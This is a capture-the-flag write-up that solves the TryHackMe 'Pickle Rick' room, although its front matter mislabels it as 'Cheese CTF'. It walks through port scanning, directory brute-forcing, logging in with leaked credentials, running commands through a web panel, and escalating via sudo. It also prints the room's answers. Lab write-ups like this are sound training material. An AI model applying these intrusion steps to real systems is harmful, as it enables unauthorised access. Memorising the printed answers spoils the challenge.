---
title: Cheese CTF - TryHackMe
date: 2025-02-05
---

<script setup>
    import RoomCard from "../../../.vitepress/components/thm/RoomCard.vue";
</script>

<RoomCard
    roomName="Pickle Rick"
    roomIcon="/ctf/tryhackme/pickle-rick/icon-room.png"
    roomLink="https://tryhackme.com/room/picklerick"
    roomLevel="EASY"
    roomTechnology="Linux"
/>

## Challenge Overview

Pickle Rick is a **web application** challenge where we must find three **hidden ingredients** to reverse Rick’s
transformation into a pickle. The challenge involves **web enumeration, command injection, and privilege escalation** to
retrieve the ingredients.

## Nmap Scan - Identifying Open Ports

We start with a **full port scan** using `nmap`:

```bash
nmap -sC -sV -v -oN pickle-rick.nmap 10.10.208.201
```

Scan Results:

```
Nmap scan report for 10.10.208.201
Host is up (0.13s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Rick is sup4r cool
| http-methods:
|_  Supported Methods: OPTIONS HEAD GET POST
|_http-server-header: Apache/2.4.41 (Ubuntu)
```

Findings:

- Port **80** (HTTP) is open → Hosting a web server.
- Port **22** (SSH) is open → Potential for privilege escalation.

## Web Enumeration - Finding Login Credentials

We visit the **website on port 80**, where we see the challenge’s objective: **find three ingredients to cure Rick**.

![Pickle Rick - Home Page](/ctf/tryhackme/pickle-rick/home-page.png)

### Checking Page Source for Hints

Inspecting the **page source**, we find a **comment** revealing a username.

```html
<!--
    Note to self, remember username!
    Username: R1ckRul3s
-->
```

### Checking robots.txt for Clues

Navigating to `/robots.txt`, we find Rick’s **favorite catchphrase**, which might be useful as a **password**:

```bash
Wubbalubbadubdub
```

## Brute-Forcing Hidden Directories

We use **Gobuster** to discover hidden directories:

```bash
gobuster dir -w /usr/share/dirb/wordlists/common.txt -t 20 -x php,txt -u "http://10.10.208.201/"
```

Discovered Paths:

```bash
/denied.php           (Status: 302) [Size: 0] [--> /login.php]
/login.php            (Status: 200) [Size: 882]
```

### Logging In

Using the **discovered credentials**, we log in:

- **Username:** `R1ckRul3s`
- **Password:** `Wubbalubbadubdub`

This gives us **access to a command execution panel**.

![Pickle Rick - Command Panel](/ctf/tryhackme/pickle-rick/command-panel.png)

## Finding the First Ingredient

### Listing Files

Using `ls`, we find a file named:

```bash
ls
Sup3rS3cretPickl3Ingred.txt
```

Attempting to read it with `cat` fails due to **output filtering**, so we use `less` instead:

```bash
less Sup3rS3cretPickl3Ingred.txt
```

First Ingredient:

```bash
mr. meeseek hair
```

## Finding the Second Ingredient

### Searching Home Directories

Checking `/home/rick/`, we find another **ingredient file**.

```bash
ls -al /home/rick
```

```
total 12
drwxrwxrwx 2 root root 4096 Feb 10  2019 .
drwxr-xr-x 4 root root 4096 Feb 10  2019 ..
-rwxrwxrwx 1 root root   13 Feb 10  2019 second ingredients
```

### Reading the File

```bash
less /home/rick/second\ ingredients
```

Second Ingredient:

```bash
1 jerry tear
```

## Privilege Escalation - Getting the Last Ingredient

### Checking Sudo Permissions

```bash
sudo -l
```

Output:

```
User www-data may run the following commands on ip-10-10-197-184:
    (ALL) NOPASSWD: ALL
```

This means we can **execute any command as root** without a password.

### Accessing Root Directory

```bash
sudo ls -al /root
```

Discovered Files:

```
-rw-r--r-- 1 root root   29 Feb 10  2019 3rd.txt
```

### Retrieving the Last Ingredient

```bash
sudo less /root/3rd.txt
```

Third Ingredient:

```bash
fleeb juice
```

## Final Ingredients List

```
1. mr. meeseek hair
2. jerry tear
3. fleeb juice
```

We successfully retrieved all **three ingredients**, completing the challenge! 🎉


